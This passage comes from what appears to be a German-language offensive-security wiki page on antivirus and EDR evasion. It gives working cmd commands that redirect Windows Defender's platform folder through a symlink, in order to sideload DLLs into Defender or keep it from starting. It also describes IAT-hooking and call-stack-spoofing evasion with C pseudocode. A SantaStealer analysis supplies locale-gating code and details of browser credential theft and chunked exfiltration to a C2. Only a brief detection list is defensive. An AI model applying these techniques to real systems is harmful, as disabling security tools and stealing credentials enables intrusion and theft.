set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink zu einer höheren Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` und die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegeln.

Post-exploitation options
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht mehr aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegieneskalation bietet; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (Crystal Kit-style)

Red teams können die Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs durch angreiferkontrollierten, position‑independent code (PIC) leiten. Das verallgemeinert Evasion über die kleine API-Oberfläche hinaus, die viele Kits exponieren (z. B. CreateProcessA), und erstreckt denselben Schutz auf BOFs und post‑exploitation DLLs.

High-level approach
- Lege ein PIC-Blob neben dem Zielmodul ab, mithilfe eines reflective loaders (vorangestellt oder als companion). Das PIC muss selbstenthaltend und position‑independent sein.
- Wenn die Host-DLL geladen wird, iteriere über ihren IMAGE_IMPORT_DESCRIPTOR und patch die IAT-Einträge für gezielte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), sodass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt Evasionen aus, bevor er per Tail‑Call die echte API-Adresse aufruft. Typische Evasionen beinhalten:
  - Speicher maskieren/entmaskieren rund um den Aufruf (z. B. Beacon-Regionen verschlüsseln, RWX→RX, Seiten-Namen/Berechtigungen ändern) und nach dem Aufruf wiederherstellen.
  - Call‑stack spoofing: konstruiere einen harmlosen Stack und wechsle in die Ziel-API, sodass Call‑stack-Analysen erwartete Frames auflösen.
- Zur Kompatibilität exportiere eine Schnittstelle, damit ein Aggressor script (oder Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post‑ex DLLs gehookt werden sollen.

Why IAT hooking here
- Funktioniert für beliebigen Code, der den gehookten Import verwendet, ohne Tool-Code zu modifizieren oder darauf angewiesen zu sein, dass Beacon als Proxy für bestimmte APIs fungiert.
- Deckt post‑ex DLLs ab: Hooking von LoadLibrary* ermöglicht das Abfangen von Modul-Ladevorgängen (z. B. System.Management.Automation.dll, clr.dll) und das Anwenden derselben Maskierungs-/Stack‑Evasion auf deren API-Aufrufe.
- Stellt die zuverlässige Nutzung von prozessstartenden post‑ex-Kommandos gegenüber call‑stack‑basierten Erkennungen wieder her, indem CreateProcessA/W umschlossen wird.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach relocations/ASLR und vor der ersten Nutzung des Imports an. Reflective loaders like TitanLdr/AceLdr demonstrate hooking während DllMain des geladenen Moduls.
- Halte wrappers klein und PIC-safe; ermittle die echte API über den originalen IAT‑Wert, den du vor dem Patchen erfasst hast, oder via LdrGetProcedureAddress.
- Verwende RW → RX transitions für PIC und vermeide writable+executable Seiten zu hinterlassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs erstellen eine fake call chain (return addresses into benign modules) und pivoten dann in die echte API.
- Das unterläuft Detektionen, die canonical stacks von Beacon/BOFs zu sensitiven APIs erwarten.
- Kombiniere mit stack cutting/stack stitching Techniken, um innerhalb erwarteter Frames vor der API‑Prolog zu landen.

Operative Integration
- Setze den reflective loader vor post‑ex DLLs ein, sodass PIC und hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor script, um Ziel‑APIs zu registrieren, sodass Beacon und BOFs transparent vom selben evasion path profitieren, ohne Code‑Änderungen.

Detection/DFIR Überlegungen
- IAT‑Integrität: Einträge, die auf non‑image (heap/anon) Adressen aufgelöst werden; periodische Verifikation der Import‑Pointer.
- Stack‑Anomalien: return addresses, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader‑Telemetry: in‑process writes an die IAT, frühe DllMain‑Aktivität, die Import‑Thunks modifiziert, unerwartete RX‑Regionen, die beim Laden erstellt werden.
- Image‑load evasion: Bei hooking von LoadLibrary* verdächtige loads von automation/clr assemblies überwachen, die mit memory masking events korrelieren.

Verwandte Bausteine und Beispiele
- Reflective loaders, die IAT patching während des Loads durchführen (z. B. TitanLdr, AceLdr)
- Memory masking hooks (z. B. simplehook) und stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (z. B. Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) shows, wie moderne info-stealers AV bypass, anti-analysis und credential access in einem einzigen Workflow kombinieren.

### Keyboard layout gating & sandbox delay

- Ein Config‑Flag (`anti_cis`) enumerates installierte Tastaturlayouts via `GetKeyboardLayoutList`. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS` Marker ab und terminiert, bevor die stealers ausgeführt werden, wodurch es auf ausgeschlossenen Locales nie detoniert, während ein Hunting‑Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mehrschichtige `check_antivm`-Logik

- Variant A durchsucht die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollenden Prüfsumme und vergleicht ihn mit eingebetteten Blocklisten für Debugger/Sandboxes; es wiederholt die Prüfsumme über den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variant B prüft Systemeigenschaften (untere Grenze der Prozessanzahl, kürzliche Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox-Erweiterungen zu erkennen, und führt Timing-Checks rund um sleeps durch, um single-stepping aufzuspüren. Jeder Treffer bricht ab, bevor Module gestartet werden.

### Fileless helper + double ChaCha20 reflective loading

- Die primäre DLL/EXE bettet einen Chromium credential helper ein, der entweder auf die Festplatte geschrieben oder manuell im Speicher gemappt wird; fileless mode löst Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Keys + 12-Byte-Nonces). Nach beiden Durchgängen lädt er den Blob reflectively (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injizieren, AppBound Encryption keys zu erben und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz ABE-Härtung.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iteriert eine globale `memory_generators` function-pointer Tabelle und startet einen Thread pro aktiviertem Modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Jeder Thread schreibt Ergebnisse in gemeinsame Puffer und meldet seine Dateianzahl nach einem ~45s join window.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz` library als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB Chunks via HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) gespooft wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk hängt `complete: true` an, damit der C2 weiß, dass die Wiederzusammenfügung abgeschlossen ist.

## Referenzen

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
